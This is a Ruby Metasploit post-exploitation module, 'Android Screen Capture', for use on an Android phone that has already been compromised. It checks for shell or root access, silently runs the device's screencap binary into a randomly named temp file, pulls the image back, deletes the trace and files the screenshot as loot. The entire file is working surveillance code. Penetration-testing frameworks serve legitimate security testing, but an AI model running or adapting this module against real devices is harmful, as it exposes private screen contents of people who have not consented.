##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Android Screen Capture',
        'Description'   => %q{
          This module takes a screenshot of the target phone.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'timwr' ],
        'Platform'      => [ 'android' ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ]
      ))

    register_options(
      [
        OptString.new('TMP_PATH', [true, 'Path to remote temp directory', '/data/local/tmp/']),
        OptString.new('EXE_PATH', [true, 'Path to remote screencap executable', '/system/bin/screencap'])
      ])
  end

  def run
    id = cmd_exec('id')
    unless id =~ /root/ or id =~ /shell/
      print_error("This module requires shell or root permissions")
      return
    end

    exe_path = datastore['EXE_PATH']
    tmp_path = datastore['TMP_PATH']
    if not file?(exe_path)
      print_error("Aborting, screencap binary not found.")
      return
    end

    begin
      file = "#{tmp_path}/#{Rex::Text.rand_text_alpha(7)}.png"
      cmd_exec("#{exe_path} -p #{file}")
      print_good("Downloading screenshot...")
      data = read_file(file)
      file_rm(file)
    rescue ::Rex::Post::Meterpreter::RequestError => e
      print_error("Error taking the screenshot")
      vprint_error("#{e.class} #{e} #{e.backtrace}")
      return
    end

    unless data
      print_error("No data for screenshot")
      return
    end

    begin
      fn = "screenshot.png"
      location = store_loot("screen_capture.screenshot", "image/png", session, data, fn, "Screenshot")
      print_good("Screenshot saved at #{location}")
    rescue ::IOError, ::Errno::ENOENT => e
      print_error("Error storing screenshot")
      vprint_error("#{e.class} #{e} #{e.backtrace}")
      return
    end
  end
end
